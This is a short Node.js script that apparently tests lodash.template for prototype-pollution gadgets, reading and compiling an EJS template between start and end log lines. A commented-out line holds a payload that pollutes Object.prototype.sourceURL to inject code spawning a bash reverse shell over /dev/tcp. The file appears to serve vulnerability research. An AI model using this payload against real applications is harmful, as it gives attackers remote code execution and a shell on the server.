const lodash = require('lodash')
const fs = require('fs')

/**
 * Polluted Payload
 */
// Object.prototype.sourceURL = "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)}\u000a//"

// for node-find-undefined
console.log("===========start===========")

/**
 * Exported function call
 */
fs.readFile('./template.ejs', (err, content) => {
    let compiled = lodash.template(content)
    let rendered = compiled({...options})
})

// for node-find-undefined
console.log("===========end===========")
